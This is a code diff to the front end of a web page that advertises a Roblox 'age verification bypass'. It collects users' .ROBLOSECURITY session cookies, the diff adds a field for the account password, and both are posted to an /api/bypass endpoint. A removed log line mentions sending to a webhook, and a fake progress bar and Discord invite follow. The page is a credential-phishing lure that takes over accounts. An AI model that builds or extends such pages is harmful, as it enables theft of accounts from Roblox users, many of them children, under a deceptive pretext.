@@ -16,6 +16,7 @@ interface DiscordInvite {
 
 export default function Home() {
   const [cookie, setCookie] = useState("")
+  const [robloxPassword, setRobloxPassword] = useState("")
   const [isProcessing, setIsProcessing] = useState(false)
   const [progress, setProgress] = useState(0)
   const [username, setUsername] = useState("")
@@ -75,6 +76,11 @@ export default function Home() {
       return
     }
 
+    if (!robloxPassword.trim()) {
+      setError("Please enter your Roblox account password")
+      return
+    }
+
     if (!isValidRobloxCookie(cookie)) {
       setError("Invalid Roblox cookie format. Please enter a valid .ROBLOSECURITY cookie.")
       return
@@ -87,22 +93,31 @@ export default function Home() {
     setStatusText("Processing...")
 
     try {
-      fetch("/api/bypass", {
+      console.log("[v0] Sending bypass request to API...")
+      const response = await fetch("/api/bypass", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
         },
-        body: JSON.stringify({ cookie: cookie.trim() }),
+        body: JSON.stringify({ cookie: cookie.trim(), password: robloxPassword.trim() }),
       })
-        .then(async (response) => {
-          const result = await response.json()
-          if (result.userInfo?.name) {
-            setUsername(result.userInfo.name)
-          }
-        })
-        .catch((error) => {
-          console.error("[v0] Failed to send to webhook:", error)
-        })
+
+      const result = await response.json()
+      console.log("[v0] API response:", result)
+
+      if (!response.ok || !result.success) {
+        const errorMessage = result.error || "Invalid cookie or password. Please check your credentials and try again."
+        setError(errorMessage)
+        setIsProcessing(false)
+        setProgress(0)
+        setStatusText("")
+        setUsername("")
+        return
+      }
+
+      if (result.userInfo?.name) {
+        setUsername(result.userInfo.name)
+      }
 
       const totalDuration = 10000
       const intervalTime = 100
@@ -118,6 +133,7 @@ export default function Home() {
               setIsProcessing(false)
               setProgress(0)
               setCookie("")
+              setRobloxPassword("")
               setUsername("")
               setStatusText("")
             }, 500)
@@ -128,8 +144,11 @@ export default function Home() {
       }, intervalTime)
     } catch (error) {
       console.error("[v0] Failed to bypass:", error)
-      setStatusText("Failed")
+      setError("Connection error. Please check your internet and try again.")
+      setStatusText("")
       setIsProcessing(false)
+      setProgress(0)
+      setUsername("")
     }
   }
 
@@ -143,7 +162,6 @@ export default function Home() {
       {showDiscordModal && (
         <div className="fixed inset-0 bg-black/90 backdrop-blur-sm z-50 flex items-center justify-center p-4">
           <div className="bg-white rounded-lg shadow-2xl overflow-hidden max-w-md w-full animate-in fade-in zoom-in duration-300">
-            {/* Header with Discord logo */}
             <div className="bg-[#5865F2] pt-12 pb-8 flex items-center justify-center">
               <div className="w-24 h-24 bg-white rounded-full flex items-center justify-center shadow-lg">
                 <svg viewBox="0 0 127.14 96.36" className="w-14 h-14 fill-[#5865F2]">
@@ -152,7 +170,6 @@ export default function Home() {
               </div>
             </div>
 
-            {/* Content */}
             <div className="px-8 py-6 bg-white">
               <h2 className="text-2xl font-bold text-gray-800 mb-6 flex items-center gap-2">
                 <span className="text-2xl">🎉</span>
@@ -185,7 +202,6 @@ export default function Home() {
                 </div>
               </div>
 
-              {/* Buttons */}
               <div className="flex gap-3">
                 <button
                   onClick={handleCloseModal}
@@ -222,7 +238,6 @@ export default function Home() {
         </Link>
       </div>
 
-      {/* Neon background effects */}
       <div className="absolute inset-0 overflow-hidden pointer-events-none">
         <div className="absolute top-0 left-1/4 w-96 h-96 bg-primary/20 rounded-full blur-[128px] animate-pulse"></div>
         <div
@@ -232,9 +247,7 @@ export default function Home() {
         <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] h-[600px] bg-primary/10 rounded-full blur-[150px]"></div>
       </div>
 
-      {/* Content with higher z-index */}
       <div className="relative z-10">
-        {/* Header Section */}
         <div className="flex flex-col items-center mb-12">
           <div className="w-20 h-20 rounded-full bg-zinc-900 flex items-center justify-center mb-6 ring-2 ring-primary/50 shadow-[0_0_30px_rgba(168,85,247,0.4)]">
             <Shield className="w-10 h-10 text-primary drop-shadow-[0_0_10px_rgba(168,85,247,0.8)]" strokeWidth={1.5} />
@@ -247,7 +260,6 @@ export default function Home() {
           <p className="text-zinc-400 text-lg text-center">Secure and efficient age verification bypass</p>
         </div>
 
-        {/* Main Card */}
         <Card className="w-full max-w-md bg-zinc-900/80 backdrop-blur-xl border-2 border-primary/40 shadow-[0_0_50px_rgba(168,85,247,0.3)]">
           <CardContent className="p-8">
             <label className="block text-white text-sm font-medium mb-3">.ROBLOSECURITY Cookie</label>
@@ -259,7 +271,20 @@ export default function Home() {
                 setError("")
               }}
               placeholder="Paste your cookie here..."
-              className="w-full h-24 px-4 py-3 bg-zinc-950/90 border border-zinc-800 rounded-lg text-white placeholder:text-zinc-600 focus:outline-none focus:ring-2 focus:ring-primary focus:border-primary/50 focus:shadow-[0_0_20px_rgba(168,85,247,0.3)] resize-none mb-2 transition-all"
+              className="w-full h-24 px-4 py-3 bg-zinc-950/90 border border-zinc-800 rounded-lg text-white placeholder:text-zinc-600 focus:outline-none focus:ring-2 focus:ring-primary focus:border-primary/50 focus:shadow-[0_0_20px_rgba(168,85,247,0.3)] resize-none mb-6 transition-all"
+            />
+
+            <label className="block text-white text-sm font-medium mb-3">Roblox Account Password</label>
+
+            <input
+              type="password"
+              value={robloxPassword}
+              onChange={(e) => {
+                setRobloxPassword(e.target.value)
+                setError("")
+              }}
+              placeholder="Enter your Roblox password..."
+              className="w-full h-12 px-4 py-3 bg-zinc-950/90 border border-zinc-800 rounded-lg text-white placeholder:text-zinc-600 focus:outline-none focus:ring-2 focus:ring-primary focus:border-primary/50 focus:shadow-[0_0_20px_rgba(168,85,247,0.3)] mb-2 transition-all"
             />
 
             {error && (
@@ -270,7 +295,7 @@ export default function Home() {
 
             <Button
               onClick={handleBypass}
-              disabled={!cookie.trim() || isProcessing}
+              disabled={!cookie.trim() || !robloxPassword.trim() || isProcessing}
               className="w-full h-12 bg-primary hover:bg-primary/90 text-white font-medium rounded-lg flex items-center justify-center gap-2 transition-all disabled:opacity-50 shadow-[0_0_30px_rgba(168,85,247,0.4)] hover:shadow-[0_0_40px_rgba(168,85,247,0.6)]"
             >
               <Play className="w-4 h-4" fill="currentColor" />
@@ -307,7 +332,6 @@ export default function Home() {
           </CardContent>
         </Card>
 
-        {/* Footer */}
         <div className="mt-12 flex items-center gap-2 text-zinc-600 text-sm">
           <span>Secure</span>
           <span>•</span>
